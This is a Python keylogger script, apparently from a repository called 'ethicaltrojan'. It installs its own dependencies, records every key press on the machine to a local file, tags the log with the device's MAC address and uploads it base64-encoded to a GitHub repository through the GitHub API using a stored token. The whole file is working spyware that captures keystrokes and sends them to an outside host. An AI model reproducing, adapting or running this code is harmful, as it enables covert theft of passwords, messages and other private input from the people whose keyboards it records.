import subprocess
import sys
import time
import json
import os
import psutil
import requests
import base64

# Function to install required packages
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install missing dependencies
required_packages = ['keyboard', 'psutil', 'requests']
for package in required_packages:
    try:
        __import__(package)  # Try to import the package to check if it's installed
    except ImportError:
        print(f"{package} not found. Installing...")
        install(package)

# Now, import after installation
import keyboard

# Load GitHub token from the config.json file
def load_github_token():
    config_file = "config.json"
    if os.path.exists(config_file):
        with open(config_file, 'r') as file:
            config = json.load(file)
            return config.get("GITHUB_TOKEN", "")
    else:
        print("Config file not found!")
        return ""

GITHUB_TOKEN = load_github_token()  # Load GitHub token
REPO_OWNER = "jonas638"
REPO_NAME = "ethicaltrojan"
FOLDER_PATH = "keylog"
LOG_FILE = 'keylog.txt'  # File to log key events

# Get the MAC address of the device
def get_mac_address():
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == psutil.AF_LINK:
                mac_address = addr.address
                if mac_address and mac_address != "00:00:00:00:00:00":
                    return mac_address.replace(":", "-").lower()
    return "00-00-00-00-00-00"

# Log key events for 5 minutes
def log_key_events(duration=300):
    start_time = time.time()
    with open(LOG_FILE, 'a') as log_file:  # Open log file in append mode
        print("Logging key events to the file...")
        while (time.time() - start_time) < duration:
            try:
                # Capture key press event
                key_event = keyboard.read_event()

                # Log key press (down) events
                if key_event.event_type == keyboard.KEY_DOWN:
                    if key_event.name == 'enter':
                        log_file.write('\n')  # Newline for Enter key
                    else:
                        log_file.write(key_event.name)  # Log the key as it is
                    log_file.flush()  # Ensure it's written immediately
                time.sleep(0.01)  # Small delay to avoid high CPU usage
            except KeyboardInterrupt:
                print("Keylogger stopped.")
                break
            except Exception as e:
                print(f"An error occurred: {e}")
                break

# Upload the keylog file to GitHub
def upload_keylog_to_github(file_path, mac_address):
    # Read the keylog file
    with open(file_path, 'r') as file:
        content = file.read()

    # Convert content to Base64
    encoded_content = base64.b64encode(content.encode()).decode()

    # GitHub API URL to upload the file
    upload_path = f"{FOLDER_PATH}/{mac_address}-keylog.txt"
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{upload_path}"

    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json",
    }

    # Check if the file already exists
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        sha = response.json()["sha"]
        message = "Updating keylog file"
    else:
        sha = None
        message = "Creating keylog file"

    payload = {
        "message": message,
        "content": encoded_content,
    }
    if sha:
        payload["sha"] = sha

    response = requests.put(url, headers=headers, data=json.dumps(payload))

    if response.status_code in [200, 201]:
        print(f"File '{upload_path}' uploaded successfully!")
    else:
        print(f"Failed to upload file: {response.status_code}")
        print(response.json())

def main():
    mac_address = get_mac_address()
    log_key_events(duration=5)  # Log key events for 5 minutes
    upload_keylog_to_github(LOG_FILE, mac_address)  # Upload the log to GitHub

if __name__ == "__main__":
    main()
